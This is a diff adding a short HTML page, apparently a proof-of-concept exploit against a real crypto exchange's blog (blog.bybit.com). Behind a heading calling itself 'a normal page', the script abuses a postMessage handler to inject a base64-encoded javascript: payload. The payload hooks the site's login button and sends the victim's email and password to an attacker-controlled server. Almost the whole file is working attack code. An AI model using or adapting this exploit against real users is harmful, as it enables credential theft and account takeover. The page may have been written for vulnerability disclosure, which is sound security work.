@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h1>Hi this is a normal page</h1>
+
+    <iframe
+      id="iframe2"
+      src="https://blog.bybit.com/?sa-visual-mode=true"
+      name='{"sa-visual-mode":true}'
+    ></iframe>
+
+    <script>
+      let attackerServer = new URLSearchParams(location.search).get(
+        "attackerServer"
+      );
+      let payload = `let win=window.open("https://blog.bybit.com/","POC")
+      let btn2;
+      let interval2=setInterval(()=>{
+        btn2=win?.document?.getElementsByClassName("cbCDYDNnhnt3b1Q6X_Gb ZuzYOdNzumbtOYJr0dbc by-button-continue cht-w-full cht-rounded-lg cht-my-3 cht-py-[9px] cht-px-0 cht-h-12  sm:cht-py-3 sm:cht-mt-5 sm:cht-mb-4")[0];
+        if(btn2){
+          clearInterval(interval2);
+          btn2.onclick=()=>{let email=win.document.getElementsByName("email")[0].value;let password=win.document.getElementsByName("password")[0].value;fetch("${attackerServer}/?victimEmail="+email+"&victimPassowrd="+password);}
+        }
+      },1000)`;
+
+      let payload64 = btoa(payload);
+
+      function sendMessage() {
+        iframe2.contentWindow.postMessage(
+          {
+            source: "sa-fe",
+            data: {
+              isVtrack: 1,
+              userURL: "javascript:javascript:eval(atob('" + payload64 + "'))",
+            },
+            type: "v-track-mode",
+          },
+          "*"
+        );
+      }
+
+      iframe2.onload = function () {
+        setTimeout(sendMessage, 5000);
+      };
+    </script>
+  </body>
+</html>
